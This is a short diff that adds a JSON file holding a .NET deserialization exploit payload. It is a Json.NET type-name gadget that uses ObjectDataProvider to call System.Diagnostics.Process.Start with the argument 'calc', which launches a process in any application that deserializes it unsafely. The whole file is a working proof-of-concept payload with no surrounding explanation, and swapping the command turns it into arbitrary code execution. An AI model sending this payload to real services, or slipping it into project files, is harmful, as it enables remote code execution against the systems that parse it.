@@ -1,0 +1,9 @@
+{
+	"$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
+		"ObjectInstance":{
+			"$type":"System.Diagnostics.Process, System"},
+		"MethodParameters":{
+			"$type":"System.Collections.ArrayList, mscorlib",
+			"$values":["calc"]},
+		"MethodName":"Start"
+}
